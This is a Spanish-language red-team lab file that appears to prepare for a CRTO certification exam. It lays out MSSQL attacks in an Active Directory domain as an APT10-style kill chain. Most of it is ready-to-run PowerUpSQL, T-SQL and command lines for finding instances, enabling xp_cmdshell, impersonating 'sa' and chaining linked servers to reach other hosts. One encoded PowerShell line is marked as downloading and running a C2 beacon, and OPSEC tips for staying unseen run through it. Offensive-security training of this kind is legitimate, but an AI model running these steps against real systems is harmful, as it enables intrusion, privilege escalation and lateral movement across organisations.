# Technique — Lab-13 Linked Shadows

> **Capability (eje didáctico):** MSSQL Attacks — enumeración, linked servers, xp_cmdshell, escalada y movimiento lateral vía SQL.
> **Bloque CRTO:** MS SQL Server Attacks (vía de lateral/escalada que el examen incluye y mucha gente pasa por alto).
> **Arquetipo:** Operación (A) — kill-chain real. El `execution/` es el plan de ataque.
> **Adversario (escenario):** APT10 / Cloud Hopper — ver [`emulation.md`](emulation.md).

> Los linked servers son literalmente "saltar entre organizaciones vinculadas vía SQL" — la esencia de Cloud Hopper. Y son un camino barato a otro segmento o dominio que el examen incluye. Tenerlo fluido suma objetivos.

---

## 1. Por qué MSSQL es relevante en un entorno AD

MSSQL se integra profundamente con Active Directory:
- Las instancias SQL suelen correr con **cuentas de servicio de dominio** o `NT AUTHORITY\SYSTEM`.
- Los **linked servers** permiten ejecutar consultas entre instancias — y heredar el contexto de autenticación.
- `xp_cmdshell` permite ejecutar comandos del SO desde SQL — si está habilitado o puede habilitarse.
- En muchos entornos enterprise, SQL es el camino más silencioso a un servidor que no tiene WinRM abierto.

## 2. Enumeración de MSSQL en el dominio

Antes de atacar, descubrir qué hay:

```
# Desde PowerView / LDAP: SPNs de MSSQL registrados en el dominio
Get-DomainComputer -SPN '*MSSQL*' | select dnshostname,serviceprincipalname

# Con PowerUpSQL (el estándar para MSSQL en CRTO)
Import-Module PowerUpSQL.ps1
Get-SQLInstanceDomain        # instancias detectadas vía SPN
Get-SQLConnectionTestThreaded # cuáles son accesibles con tu cuenta
```

**OPSEC:** la enumeración de SPNs vía LDAP es discreta; las conexiones de test a cada instancia son más ruidosas. Primero LDAP, luego test selectivo.

## 3. Enumeración de la instancia (una vez conectado)

```sql
-- ¿Con qué privilegios estoy?
SELECT SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin')

-- ¿Qué linked servers hay?
SELECT name, data_source FROM sys.servers WHERE is_linked = 1

-- ¿Qué linked servers puedo usar?
EXEC sp_linkedservers
```

**Nivel de privilegio en SQL:** importa más que el privilegio de Windows en este punto.
- **Public** → mínimo, solo lectura básica.
- **db_owner** → control de la base de datos.
- **sysadmin** → control total, incluye `xp_cmdshell`.

## 4. xp_cmdshell — ejecución de OS commands

Cuando tienes `sysadmin` (o puedes conseguirlo), `xp_cmdshell` te da shell en el SO bajo el contexto de la cuenta de servicio de SQL:

```sql
-- ¿Está habilitado?
SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell'

-- Habilitarlo (requiere sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Ejecutar comando
EXEC xp_cmdshell 'whoami'
EXEC xp_cmdshell 'powershell -enc <base64>'  -- descarga/ejecuta beacon
```

**El objetivo operativo:** ejecutar un beacon en el servidor SQL — obtener una baliza bajo la cuenta de servicio de SQL (frecuentemente con privilegios elevados o interesantes).

## 5. Linked Servers — el lateral implícito

Los linked servers permiten ejecutar consultas en una instancia remota **con el contexto heredado o mapeado**. Si SQL-A tiene un linked server a SQL-B, desde SQL-A puedes:

```sql
-- Ejecutar query en el linked server
SELECT * FROM OPENQUERY([SQL-B], 'SELECT SYSTEM_USER')

-- Ejecutar xp_cmdshell en el linked server (si sysadmin allí)
EXEC ('xp_cmdshell ''whoami''') AT [SQL-B]

-- Cadena de linked servers (saltar a SQL-C a través de SQL-B)
EXEC ('EXEC (''xp_cmdshell ''''whoami'''''' '') AT [SQL-C]') AT [SQL-B]
```

**La trampa elegante:** el linked server puede correr bajo una cuenta distinta a la tuya — con más privilegios. Y puede existir en otro dominio. Literalmente "salto de servidor en servidor siguiendo la cadena de confianza SQL".

## 6. Escalada dentro de SQL

Si no tienes `sysadmin` directamente:
- **Impersonation:** `EXECUTE AS LOGIN = 'sa'` si se permite (chequear `fn_my_permissions`).
- **Linked server con credenciales diferentes:** el linked server puede estar configurado con credenciales de sysadmin aunque tu usuario no lo sea.
- **Database Trustworthy / CLR:** técnicas avanzadas de escalada interna de SQL.

```sql
-- ¿Quién puedo impersonar?
SELECT distinct b.name FROM sys.server_permissions a
  INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
  WHERE a.permission_name = 'IMPERSONATE'

-- Impersonar y escalar
EXECUTE AS LOGIN = 'sa'; SELECT IS_SRVROLEMEMBER('sysadmin')
```

## 7. Equivalencia CS ↔ Sliver

| Acción | Cobalt Strike | Sliver |
|--------|---------------|--------|
| Enum MSSQL en dominio | `execute-assembly PowerUpSQL.exe` | `execute-assembly PowerUpSQL.exe` |
| Conectar y ejecutar SQL | `execute-assembly ...` / `shell sqlcmd` | `shell sqlcmd` / `execute-assembly` |
| xp_cmdshell → beacon | `execute-assembly` / stager vía SQL | `shell` + stager |

## 8. MITRE ATT&CK

| Táctica | Técnica | ID |
|---------|---------|----|
| Discovery | Network Service Discovery (SQL) | T1046 |
| Lateral Movement | Exploitation of Remote Services | T1210 |
| Execution | Command and Scripting via xp_cmdshell | T1059 |
| Privilege Escalation | SQL Server impersonation | T1548 |

## 9. Key Takeaways

1. **MSSQL + AD = ruta de lateral que la gente ignora.** SPNs, linked servers y cuentas de servicio de dominio lo hacen poderoso.
2. **Linked servers son lateral implícito.** Saltar de SQL-A a SQL-B a SQL-C siguiendo la cadena es Cloud Hopper aplicado.
3. **xp_cmdshell = shell en el SO.** Con sysadmin, tienes ejecución directa. El objetivo siempre es un beacon bajo la cuenta de servicio.
4. **OPSEC:** habilitación de xp_cmdshell deja rastro en los logs de SQL. Siempre verificar si ya está habilitado antes de modificar configuración.

## Referencias

- PowerUpSQL — github.com/NetSPI/PowerUpSQL
- MITRE ATT&CK — T1210 Exploitation of Remote Services
- HackTricks — MSSQL Abusing
- CRTO — MS SQL Server Attacks module

---

*Technique · Lab-13 Linked Shadows · MSSQL lateral y linked servers (anatomía v3.1, arquetipo operación)*
